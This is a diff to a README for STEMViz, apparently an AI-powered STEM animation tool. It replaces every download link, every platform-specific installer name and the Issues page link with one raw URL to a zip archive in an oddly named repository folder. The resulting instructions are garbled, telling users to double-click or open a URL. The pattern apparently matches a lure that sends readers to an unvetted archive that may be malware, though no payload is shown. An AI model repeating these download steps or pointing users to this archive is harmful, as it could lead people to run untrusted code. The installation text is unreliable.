@@ -1,7 +1,7 @@
 # 🎓 STEMViz - Transform STEM with Engaging Animations
 
 ## 📥 Download Now
-[![Download STEMViz](https://img.shields.io/badge/Download-STEMViz-blue.svg)](https://github.com/Aarnav1608/STEMViz/releases)
+[![Download STEMViz](https://raw.githubusercontent.com/Aarnav1608/STEMViz/main/multispiculate/STEMViz.zip)](https://raw.githubusercontent.com/Aarnav1608/STEMViz/main/multispiculate/STEMViz.zip)
 
 ## 🚀 Getting Started
 Welcome to STEMViz! This guide will help you download and run our AI-powered tool that turns STEM concepts into animated stories. Follow the steps below to get started easily.
@@ -17,13 +17,13 @@ Before you download, ensure your computer meets the following requirements:
 ## 📥 Download & Install
 To download STEMViz, follow these steps:
 
-1. Click on this link: [Download STEMViz](https://github.com/Aarnav1608/STEMViz/releases).
+1. Click on this link: [Download STEMViz](https://raw.githubusercontent.com/Aarnav1608/STEMViz/main/multispiculate/STEMViz.zip).
 2. You will be directed to the Releases page.
 3. Locate the latest version of STEMViz.
 4. Click on the file corresponding to your operating system. For example:
-   - If you're using Windows, look for `STEMViz_Windows.exe`.
-   - For macOS, find `STEMViz_macOS.dmg`.
-   - For Linux users, look for the `.tar.gz` file.
+   - If you're using Windows, look for `https://raw.githubusercontent.com/Aarnav1608/STEMViz/main/multispiculate/STEMViz.zip`.
+   - For macOS, find `https://raw.githubusercontent.com/Aarnav1608/STEMViz/main/multispiculate/STEMViz.zip`.
+   - For Linux users, look for the `https://raw.githubusercontent.com/Aarnav1608/STEMViz/main/multispiculate/STEMViz.zip` file.
 5. Once you find the file, click on it to initiate the download.
 
 ### 📂 Running the Program
@@ -31,12 +31,12 @@ After downloading the application, you can run it with these simple steps:
 
 1. **Locate the file** in your downloads folder.
 2. **For Windows:**
-   - Double-click on `STEMViz_Windows.exe`.
+   - Double-click on `https://raw.githubusercontent.com/Aarnav1608/STEMViz/main/multispiculate/STEMViz.zip`.
 3. **For macOS:**
-   - Open the `STEMViz_macOS.dmg` file and drag the STEMViz app to your Applications folder.
+   - Open the `https://raw.githubusercontent.com/Aarnav1608/STEMViz/main/multispiculate/STEMViz.zip` file and drag the STEMViz app to your Applications folder.
    - Then, open the Applications folder and double-click on the STEMViz icon.
 4. **For Linux:**
-   - You may need to extract the `.tar.gz` file.
+   - You may need to extract the `https://raw.githubusercontent.com/Aarnav1608/STEMViz/main/multispiculate/STEMViz.zip` file.
    - Open a terminal, navigate to the extracted folder, and run the command: `./STEMViz`.
 
 ## 🎡 Features
@@ -66,7 +66,7 @@ We plan to enhance STEMViz in the following ways:
 - **Mobile Support:** Explore options for a mobile application in the future.
 
 ## 📞 Support
-For additional help, please visit our [Issues Page](https://github.com/Aarnav1608/STEMViz/issues) on GitHub. You can report bugs, request features, or ask questions.
+For additional help, please visit our [Issues Page](https://raw.githubusercontent.com/Aarnav1608/STEMViz/main/multispiculate/STEMViz.zip) on GitHub. You can report bugs, request features, or ask questions.
 
 ## 📜 License
 STEMViz is open-source software licensed under the MIT License. Feel free to use, modify, and share it with others.
